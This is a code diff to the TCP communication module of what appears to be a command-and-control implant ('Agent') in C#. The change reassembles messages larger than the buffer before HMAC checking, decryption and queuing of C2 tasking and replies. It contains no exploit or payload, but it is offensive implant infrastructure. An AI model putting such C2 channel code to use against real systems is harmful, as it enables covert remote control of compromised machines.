@@ -1,6 +1,7 @@
 ﻿using AgentCore.Controllers;
 using AgentCore.Interfaces;
 using AgentCore.Models;
+
 using Common;
 using Common.Models;
 
@@ -18,6 +19,7 @@ namespace Agent.Modules
         public NetworkStream workStream = null;
         public const int BufferSize = 65535;
         public byte[] buffer = new byte[BufferSize];
+        public byte[] tmpBuffer = null;
     }
 
     public class TcpCommModule : ICommModule
@@ -117,41 +119,77 @@ namespace Agent.Modules
             {
                 var dataReceived = state.buffer.TrimBytes();
 
-                if (Crypto.VerifyHMAC(dataReceived))
+                if (bytesRead == state.buffer.Length)
                 {
-                    var inbound = Crypto.Decrypt<List<AgentMessage>>(dataReceived);
-
-                    if (inbound.Count > 0)
+                    if (state.tmpBuffer != null)
                     {
-                        foreach (var dataIn in inbound)
-                        {
-                            InboundC2Data.Enqueue(dataIn);
-                        }
+                        var tmp = state.tmpBuffer;
+                        state.tmpBuffer = new byte[tmp.Length + dataReceived.Length];
+                        Buffer.BlockCopy(tmp, 0, state.tmpBuffer, 0, tmp.Length);
+                        Buffer.BlockCopy(dataReceived, 0, state.tmpBuffer, tmp.Length, dataReceived.Length);
                     }
-                }
-
-                var outbound = new List<AgentMessage>();
-
-                if (OutboundC2Data.Count > 0)
-                {
-                    while (OutboundC2Data.Count != 0)
+                    else
                     {
-                        outbound.Add(OutboundC2Data.Dequeue());
+                        state.tmpBuffer = new byte[dataReceived.Length];
+                        Buffer.BlockCopy(dataReceived, 0, state.tmpBuffer, 0, dataReceived.Length);
                     }
+
+                    Array.Clear(state.buffer, 0, state.buffer.Length);
+                    stream.BeginRead(state.buffer, 0, state.buffer.Length, new AsyncCallback(ReadCallback), state);
                 }
                 else
                 {
-                    outbound.Add(new AgentMessage
+                    byte[] final;
+                    if (state.tmpBuffer != null)
                     {
-                        IdempotencyKey = Guid.NewGuid().ToString(),
-                        Metadata = Config.GetOption(ConfigSetting.Metadata) as AgentMetadata,
-                        Data = new C2Data()
-                    });
+                        final = new byte[state.tmpBuffer.Length + dataReceived.Length];
+                        Buffer.BlockCopy(state.tmpBuffer, 0, final, 0, state.tmpBuffer.Length);
+                        Buffer.BlockCopy(dataReceived, 0, final, state.tmpBuffer.Length, dataReceived.Length);
+                    }
+                    else
+                    {
+                        final = new byte[dataReceived.Length];
+                        Buffer.BlockCopy(dataReceived, 0, final, 0, dataReceived.Length);
+                    }
+
+                    var finalData = final.TrimBytes();
+
+                    if (Crypto.VerifyHMAC(finalData))
+                    {
+                        var inbound = Crypto.Decrypt<List<AgentMessage>>(finalData);
+
+                        if (inbound.Count > 0)
+                        {
+                            foreach (var dataIn in inbound)
+                            {
+                                InboundC2Data.Enqueue(dataIn);
+                            }
+                        }
+                    }
+
+                    var outbound = new List<AgentMessage>();
+
+                    if (OutboundC2Data.Count > 0)
+                    {
+                        while (OutboundC2Data.Count != 0)
+                        {
+                            outbound.Add(OutboundC2Data.Dequeue());
+                        }
+                    }
+                    else
+                    {
+                        outbound.Add(new AgentMessage
+                        {
+                            IdempotencyKey = Guid.NewGuid().ToString(),
+                            Metadata = Config.GetOption(ConfigSetting.Metadata) as AgentMetadata,
+                            Data = new C2Data()
+                        });
+                    }
+
+                    var dataToSend = Crypto.Encrypt(outbound);
+
+                    SendDataToClient(stream, dataToSend);
                 }
-
-                var dataToSend = Crypto.Encrypt(outbound);
-
-                SendDataToClient(stream, dataToSend);
             }
         }
 
